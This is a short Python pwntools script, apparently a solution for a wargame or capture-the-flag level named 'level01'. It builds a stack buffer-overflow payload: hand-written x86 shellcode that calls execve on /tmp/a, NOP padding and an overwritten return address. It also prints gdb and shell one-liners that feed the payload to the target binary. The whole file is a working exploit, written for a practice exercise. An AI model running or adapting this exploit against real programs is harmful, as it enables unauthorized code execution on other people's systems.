#!/usr/bin/python3
from binascii import hexlify
from pwn import *

start = 0xffffddcc
left_space = 3
data = b" " * left_space + b"/tmp/a\0"
shellcode = b"\xB8\x0B\x00\x00\x00\xBB\xCF\xDD\xFF\xFF\x31\xC9\x89\xCA\xCD\x80"
payload = (data + shellcode).ljust(80, b'\x90')

shellcode_start = start + len(data)
path_start = start + left_space;
print(f"Check path:")
print(f"x /s {hex(path_start)}")
print("Check shellcode: ")
print(f"x /{len(shellcode)}i {hex(shellcode_start)}")

#payload += p32(shellcode_start)
payload += p32(0xdeadbeef)

print("\n" + '*' * 80)
gcc_string = b'run < <(printf "dat_will\n'
print(repr(gcc_string + payload + b'")')[2:-1])
print()
print("python -c 'print(b\"dat_will\\n" + repr(payload)[2:-1] + "\")'" + " | env -i PWD=/home/users/level01 SHELL=\"/bin/bash\" SHLVL=0 /home/users/level01/level01")
